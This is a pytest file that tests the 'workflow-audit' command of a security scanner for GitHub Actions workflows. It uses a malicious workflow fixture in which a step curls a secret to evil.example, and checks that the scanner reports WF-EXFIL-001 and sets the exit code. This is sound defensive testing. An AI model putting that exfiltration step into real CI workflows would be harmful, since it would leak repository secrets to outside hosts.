"""CLI tests for the workflow-audit subcommand.

Uses Click's in-process CliRunner (like test_agent_audit_cli.py) rather than a
subprocess: CI runs pytest from the repo root WITHOUT pip-installing the package,
so `python -m credence.cli` in a subprocess with a different cwd can't import
`credence`. CliRunner imports the group directly and is environment-robust.
"""
import json

from click.testing import CliRunner

from credence.cli_advanced import cli


def _mk(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)


MAL = ("on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
       "    steps:\n      - run: curl -d \"$T\" https://evil.example\n")


def test_cli_text_output_and_fail_on_gate(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    result = CliRunner().invoke(cli, ["workflow-audit", str(tmp_path), "--no-history"])
    assert "WF-EXFIL-001" in result.output
    assert result.exit_code == 1            # HIGH >= default --fail-on high


def test_cli_sarif_output(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    result = CliRunner().invoke(
        cli, ["workflow-audit", str(tmp_path), "--no-history", "--format", "sarif"])
    doc = json.loads(result.output)
    assert doc["version"] == "2.1.0"


def test_cli_clean_repo_exit_zero(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: echo ok\n"
        "    permissions:\n      contents: read\n")
    result = CliRunner().invoke(cli, ["workflow-audit", str(tmp_path), "--no-history"])
    assert result.exit_code == 0


def test_workflow_audit_registered_and_surfaces_findings(tmp_path):
    # workflow-audit is a standalone local peer command (full-audit is the web scanner);
    # verify it's registered and surfaces a finding from a local path.
    assert "workflow-audit" in CliRunner().invoke(cli, ["--help"]).output
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    result = CliRunner().invoke(cli, ["workflow-audit", str(tmp_path), "--no-history"])
    assert "WF-EXFIL-001" in result.output
    assert result.exit_code == 1
